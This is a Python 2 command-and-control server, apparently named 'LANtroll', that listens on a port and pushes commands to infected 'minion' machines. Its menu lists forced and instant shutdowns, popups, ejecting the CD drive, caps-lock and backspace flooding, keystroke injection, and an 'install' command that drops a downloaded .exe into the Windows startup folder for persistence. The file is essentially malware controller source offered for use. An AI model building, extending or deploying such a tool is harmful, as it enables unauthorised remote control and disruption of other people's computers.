#!/usr/bin/python
import socket
print('''
      :::            :::     ::::    ::: ::::::::::: :::::::::   ::::::::  :::        :::  
     :+:          :+: :+:   :+:+:   :+:     :+:     :+:    :+: :+:    :+: :+:        :+:   
    +:+         +:+   +:+  :+:+:+  +:+     +:+     +:+    +:+ +:+    +:+ +:+        +:+    
   +#+        +#++:++#++: +#+ +:+ +#+     +#+     +#++:++#:  +#+    +:+ +#+        +#+     
  +#+        +#+     +#+ +#+  +#+#+#     +#+     +#+    +#+ +#+    +#+ +#+        +#+      
 #+#        #+#     #+# #+#   #+#+#     #+#     #+#    #+# #+#    #+# #+#        #+#       
########## ###     ### ###    ####     ###     ###    ###  ########  ########## ##########
''')
print('''(s) = Spoil your non-excistance. Since it creates a file on the desktop.
- shutdown: Initates a shutdown command.
- test: Starts the calculator.
- cancel: Stops any current shutdown commands AND terminates all 'wscript.exe' processes.
- message [input text](s): Makes a popup box with custom text. NOTE: You cant include any words that also is commands currently.
- disable: stops the minion process.
- opencd: opens the cd drive continuously.
- togglecaps(s): Continuously toggle capslock, disable with 'cancel' command.
- backspaces(s): Continuously use backspace, disable with 'cancel' command.
- ghostkeys [input text](s): Make custom keystroke on Minion.
- cleanup: Removes .vbs files your desktop.
- install: Downloads the latest .exe version and places it in the windows 'start folder'.
- uninstall: Removes the .exe file in start folder.
- restart: Full of bugs currently don't touch for your own good. Original description: Only to be used after install command. Only starts the process in 'start folder'.
- instantshutdown: Note: this is not nice.
''')
command = raw_input("Enter your command, commander: ")
s = socket.socket()
print("Socket successfully created")
port = 12345
s.bind(('', port))
print("socket binded to %s" %(port))
s.listen(5)
print("socket is listening")
while True:
    c, addr = s.accept()
    print('Got connection from', addr)
    c.send(command)
    c.close()

print('''
db       .d8b.  d8b   db d888888b d8888b.  .d88b.  db      db      
88      d8' `8b 888o  88 `~~88~~' 88  `8D .8P  Y8. 88      88      
88      88ooo88 88V8o 88    88    88oobY' 88    88 88      88      
88      88~~~88 88 V8o88    88    88`8b   88    88 88      88      
88booo. 88   88 88  V888    88    88 `88. `8b  d8' 88booo. 88booo. 
Y88888P YP   YP VP   V8P    YP    88   YD  `Y88P'  Y88888P Y88888P 
''')

print('''
888             d8888 888b    888 88888888888              888 888 
888            d88888 8888b   888     888                  888 888 
888           d88P888 88888b  888     888                  888 888 
888          d88P 888 888Y88b 888     888  888d888 .d88b.  888 888 
888         d88P  888 888 Y88b888     888  888P"  d88""88b 888 888 
888        d88P   888 888  Y88888     888  888    888  888 888 888 
888       d8888888888 888   Y8888     888  888    Y88..88P 888 888 
88888888 d88P     888 888    Y888     888  888     "Y88P"  888 888
''')
